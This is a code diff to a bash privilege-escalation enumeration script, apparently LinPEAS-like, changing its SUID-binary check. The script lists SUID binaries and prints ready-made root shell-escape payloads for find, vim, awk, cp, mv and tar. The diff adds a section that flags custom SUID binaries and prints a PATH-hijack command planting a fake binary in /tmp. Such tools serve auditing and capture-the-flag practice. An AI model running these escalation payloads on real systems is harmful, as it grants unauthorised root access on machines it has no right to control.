@@ -162,7 +162,6 @@ check_suid() {
     )
 
     # 2. Find SUID binaries (filtering out harmless system defaults to reduce noise)
-    # We exclude standard binaries like passwd, sudo, ping unless they are oddly modified
     local suid_bins
     suid_bins=$(find / -perm -4000 -type f 2>/dev/null | sort -u)
 
@@ -179,8 +178,7 @@ check_suid() {
         # Skip known benign default SUIDs to reduce visual noise
         case "$base" in
             passwd|sudo|su|mount|umount|ping|ping6|chfn|chsh|newgrp|gpasswd|pkexec)
-                # If it's in a weird location (e.g., /tmp/passwd), we shouldn't skip it. 
-                # We only skip if it's in standard /bin or /usr/bin paths.
+                # Only skip if it's in standard /bin or /usr/bin paths
                 if [[ "$bin" == /bin/* || "$bin" == /usr/bin/* ]]; then
                     info "Standard SUID (benign): $bin"
                     continue
@@ -214,12 +212,10 @@ check_suid() {
                         find)
                             payload="$bin . -exec /bin/sh -p \\; -quit";;
                         vim|vi|nano|less|more|man)
-                            payload="$bin -c ':!/bin/sh'";; # Note: less/more/man use `!sh` but this works for vim
+                            payload="$bin -c ':!/bin/sh'";; 
                         awk|gawk)
                             payload="$bin 'BEGIN{system(\"/bin/sh\")}'";;
-                        cp)
-                            payload="$bin /bin/bash /tmp/rb && /tmp/rb -p";;
-                        mv)
+                        cp|mv)
                             payload="$bin /bin/bash /tmp/rb && /tmp/rb -p";;
                         tar)
                             payload="$bin -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh";;
@@ -242,25 +238,48 @@ check_suid() {
             vuln_count=$((vuln_count + 1))
             vuln "SUID $base: $bin" "$payload"
         else
-            # If it's an unknown SUID, it might be custom. 
-            # Print it as INFO (not VULN) so the user can investigate manually.
             info "SUID binary (unknown, check manually): $bin"
         fi
 
     done <<< "$suid_bins"
 
-    # 5. Summary
+    # =========================================================
+    # 5. Look for custom SUID binaries (CTF / PATH Hijack check)
+    # =========================================================
+    if command -v strings &>/dev/null; then
+        local custom_suid
+        custom_suid=$(find /usr/local/bin /opt /home -perm -4000 -type f 2>/dev/null)
+
+        if [[ -n "$custom_suid" ]]; then
+            while IFS= read -r bin; do
+                # Check if the binary runs 'system()' or 'popen()' without a full path
+                if strings "$bin" 2>/dev/null | grep -qE "^[a-z]+$|^[a-z]+ "; then
+                    local cmd
+                    cmd=$(strings "$bin" 2>/dev/null | grep -oE "^[a-z]+$" | head -1)
+                    if [[ -n "$cmd" ]]; then
+                        vuln_count=$((vuln_count + 1))
+                        vuln "Potential PATH Hijack in custom SUID: $bin" "Check if it runs '$cmd' without a full path. Try: echo '/bin/bash' > /tmp/$cmd && chmod +x /tmp/$cmd && export PATH=/tmp:\$PATH && $bin"
+                    fi
+                fi
+            done <<< "$custom_suid"
+        fi
+    else
+        info "strings not installed — skipping custom SUID PATH hijack check"
+    fi
+
+    # =========================================================
+    # 6. Summary
+    # =========================================================
+    echo ""
     if [[ $found -eq 0 ]]; then
         safe "No SUID binaries found"
     else
-        echo ""
         if [[ $vuln_count -gt 0 ]]; then
             echo -e "  ${LRED}[!] Exploitable SUID binaries found: $vuln_count${RESET}"
         fi
         info "Total SUID binaries scanned: $found"
     fi
 }
-
 # --------------------------- 3. LINUX CAPABILITIES ---------------------------
 check_capabilities() {
     section "3. LINUX CAPABILITIES"
